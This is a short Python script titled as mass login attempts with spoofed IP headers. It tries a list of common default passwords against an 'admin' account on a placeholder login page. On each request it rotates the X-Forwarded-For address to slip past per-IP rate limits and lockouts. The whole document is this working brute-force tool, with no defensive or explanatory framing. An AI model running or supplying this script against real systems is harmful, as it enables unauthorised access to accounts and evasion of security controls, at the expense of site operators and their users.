"""
⚙️ Mass login attempts with spoofed IP headers
"""

import requests
from time import sleep

url = "http://vulnerable.site/login"
user = "admin"
passwords = ["admin", "123456", "password", "admin123"]

for i, pwd in enumerate(passwords):
    spoofed_ip = f"192.168.1.{100 + i}"
    headers = {
        "X-Forwarded-For": spoofed_ip,
        "User-Agent": "Mozilla/5.0",
    }
    data = {"username": user, "password": pwd}
    r = requests.post(url, headers=headers, data=data)
    print(f"[{spoofed_ip}] => {pwd} => {r.status_code}")
    sleep(1)
